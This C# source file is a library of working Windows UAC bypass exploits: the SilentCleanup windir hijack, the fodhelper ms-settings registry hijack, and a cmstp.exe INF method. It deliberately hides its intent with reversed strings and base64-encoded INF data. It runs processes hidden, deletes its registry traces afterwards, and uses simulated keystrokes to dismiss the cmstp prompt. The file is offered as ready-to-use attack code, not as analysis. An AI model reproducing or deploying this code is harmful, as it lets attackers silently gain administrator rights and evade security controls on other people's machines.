﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UacHelper
{
    public class WinDirSluiHelper
    {
        public static async Task<bool> Run(string path)
        {
            bool worked = false;

            var originalWindir = Environment.GetEnvironmentVariable("windir");

            try
            {
                Environment.SetEnvironmentVariable("windir", '"' + path + '"' + " ;#", EnvironmentVariableTarget.Process);

                var processStartInfo = new ProcessStartInfo
                {
                    FileName = "SCHTASKS.exe",
                    Arguments = @"/run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I",
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (var process = Process.Start(processStartInfo))
                {
                    while (!process.HasExited)
                        await Task.Delay(100);

                    if (process.ExitCode == 0)
                    {
                        worked = true;
                    }
                }
            }
            catch
            {
                worked = false;
            }
            finally
            {
                Environment.SetEnvironmentVariable("windir", originalWindir, EnvironmentVariableTarget.Process);
            }

            return worked;
        }

    }


    public class FodHelper 
    {

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(
         string lpApplicationName,
         string lpCommandLine,
         IntPtr lpProcessAttributes,
         IntPtr lpThreadAttributes,
         bool bInheritHandles,
         int dwCreationFlags,
         IntPtr lpEnvironment,
         string lpCurrentDirectory,
         ref STARTUPINFO lpStartupInfo,
         ref PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        public static async Task<bool> Run(string path) 
        {
            IntPtr test = IntPtr.Zero;
            bool worked = false;
            Wow64DisableWow64FsRedirection(ref test);
            RegistryKey alwaysNotify = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            string consentPrompt = alwaysNotify.GetValue("ConsentPromptBehaviorAdmin").ToString();
            string secureDesktopPrompt = alwaysNotify.GetValue("PromptOnSecureDesktop").ToString();
            alwaysNotify.Close();

            if (consentPrompt == "2" & secureDesktopPrompt == "1")
            {
                return worked;
            }

            //Set the registry key for fodhelper
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");

            RegistryKey fodhelper = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
            fodhelper.SetValue("DelegateExecute", "");
            fodhelper.SetValue("", path);
            fodhelper.Close();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            worked = CreateProcess(
                null,
                "cmd /c start \"\" \"%windir%\\system32\\fodhelper.exe\"",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x08000000,
                IntPtr.Zero,
                null,
                ref si,
                ref pi);//make it hidden
            
            await Task.Delay(2000);
            newkey.DeleteSubKeyTree("ms-settings");
            Wow64RevertWow64FsRedirection(test);
            return worked;
        }
        
    }


    public class CmstpHelper//copy pasted from my prevoius project 
    {
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }
        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }
        // Our .INF file data!
        public static string pt1 = "NEc1RXZTVmcQ5WdStlCNoQDu9Wa0NWZTNHZuFWbt92QwVHdlNVZyBlb1JVPzRmbh1WbvNEc1RXZTVmcQ5WdSpQDzJXZzVFbsFkbvlGdjV2U0NXZER3culEdzV3Q942bpRXYulGdzVGRt9GdzV3QK0QXsxWY0NnbJRHb1FmZlR0WK0gCNUjLy0jROlEZlNmbhZHZBpQDk82ZhNWaoNGJ9Umc1RXYudWaTpQDd52bpNnclZ3W";
        public static string pt2 = "UsxWY0NnbJVGbpZ2byBlIgwiIFhVRuIzMSdUTNNEXzhGdhBFIwBXQc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90UiACLi0ETLhkIK0QXu9Wa0NWZTRUSEx0XyV2UVxGbBtlCNoQD3ACLu9Wa0NWZTRUSEx0XyV2UVxGbB1TMwATO0wCMwATO0oQDdNnclNXVsxWQu9Wa0NWZTR3clREdz5WS0NXdDtlCNoQDG9CIlhXZuAHdz12Yg0USvACbsl2arNXY0pQDF5USM9FROFUTN90QfV0QBxEUFJlCNwGbhR3culGIvRHIz5WanVmQgAXd0V2UgUmcvZWZCBib1JHIlJGIsxWa3BSZyVGSgMHZuFWbt92QgsjCN0lbvlGdjV2UzRmbh1Wbv";
        public static string pt3 = "gCNoQDi4EUWBncvdkI9UWbh50Y2NFdy9GaTpQDi4EUWBncvdkI9UWbh5UZjlmdyV2UK0QXzdmbpJHdTtlCNoQDiICIsISJy9mcyVEZlR3YlBHel5WVlICIsICa0FG";
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

        public static string path = "UGel5Cc0NXbjxlMz0WZ0NXezx1c39GZul2dcpzY";

        public static string Reverse(string s)
        {
            char[] charArray = s.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }
        public static string SetData(string CommandToExecute)
        {
            string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
            string TemporaryDir = "C:\\" + Reverse("swodniw") + "\\" + Reverse("pmet");
            StringBuilder OutputFile = new StringBuilder();
            OutputFile.Append(TemporaryDir);
            OutputFile.Append("\\");
            OutputFile.Append(RandomFileName);
            OutputFile.Append("." + Reverse(Reverse(Reverse("ni"))) + Reverse("f"));
            string data = Reverse(pt1) + Reverse(pt3 + pt2);
            data = Base64Decode(data + "==");
            StringBuilder newInfData = new StringBuilder(data);
            var f = "MOC_ECALPER";
            f += "";
            newInfData.Replace(Reverse("ENIL_DNAM" + f), CommandToExecute);
            File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
            return OutputFile.ToString();
        }

        public static void Kill()
        {
            foreach (var process in Process.GetProcessesByName(Reverse("ptsmc")))
            {
                process.Kill();
                process.Dispose();
            }
        }
        public static bool Run(string CommandToExecute)
        {
            string datapath = Base64Decode(Reverse(path) + "=");
            if (!File.Exists(datapath))
            {
                return false;
            }
            StringBuilder InfFile = new StringBuilder();
            InfFile.Append(SetData(CommandToExecute));
            ProcessStartInfo startInfo = new ProcessStartInfo(datapath);
            startInfo.Arguments = "/" + Reverse("ua") + " " + InfFile.ToString();
            startInfo.UseShellExecute = false;
            Process.Start(startInfo).Dispose();

            IntPtr windowHandle = new IntPtr();
            windowHandle = IntPtr.Zero;
            do
            {
                windowHandle = SetWindowActive(Reverse("ptsmc"));
            } while (windowHandle == IntPtr.Zero);

            SendKeys.SendWait(Reverse(Reverse(Reverse(Reverse("{")))) + Reverse(Reverse("ENT")) + Reverse("}RE"));
            return true;
        }

        public static IntPtr SetWindowActive(string ProcessName)
        {
            Process[] target = Process.GetProcessesByName(ProcessName);
            if (target.Length == 0) return IntPtr.Zero;
            target[0].Refresh();
            IntPtr WindowHandle = new IntPtr();
            WindowHandle = target[0].MainWindowHandle;
            if (WindowHandle == IntPtr.Zero) return IntPtr.Zero;
            SetForegroundWindow(WindowHandle);
            ShowWindow(WindowHandle, 5);
            foreach (Process process in target) 
            { 
                process.Dispose();
            }
            return WindowHandle;
        }
    }

}
